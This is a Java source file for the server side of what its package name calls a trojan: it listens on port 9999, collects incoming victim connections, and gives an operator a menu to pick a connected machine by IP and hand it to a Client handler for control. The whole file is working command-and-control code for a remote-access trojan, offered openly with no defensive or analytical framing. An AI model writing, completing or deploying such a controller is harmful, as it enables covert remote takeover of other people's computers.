package com.kien.trojan.server;

import lombok.Data;

import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

import static java.lang.Integer.parseInt;

@Data
public class Server extends Thread {
    int port = 9999;
    String endSignal = "%**%";
    List<Client> clients = new ArrayList<>();
    Scanner scanner;
    ServerSocket serverSocket;

    public Server() {
        try {
            this.serverSocket = new ServerSocket(port);
            scanner = new Scanner(System.in);
        } catch (Exception ex) {
        }
    }

    @Override
    public void run() {
        //Used to read user input
        while (true) {
            try {
                Socket socket = serverSocket.accept();
                Client client = new Client(endSignal, socket, scanner, this);
                clients.add(client);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    public void menu() {
        while (true) {
            System.out.println(".......................Connections.......................");
            System.out.println("0. reset");
            for (int i = 0 ; i < clients.size() ; i++) {
                System.out.println(i + 1 + ". " + clients.get(i).getIp());
            }
            int index = 0;
            System.out.println("Index: ");

            try {
                index = parseInt(scanner.nextLine());
            } catch (Exception ex) {
                index = 0;
            }

            if (index == 0) continue;
            clients.get(index-1).run();
        }
    }

    public static void main(String[] args) {
        Server server = new Server();
        server.start();
        server.menu();
    }
}
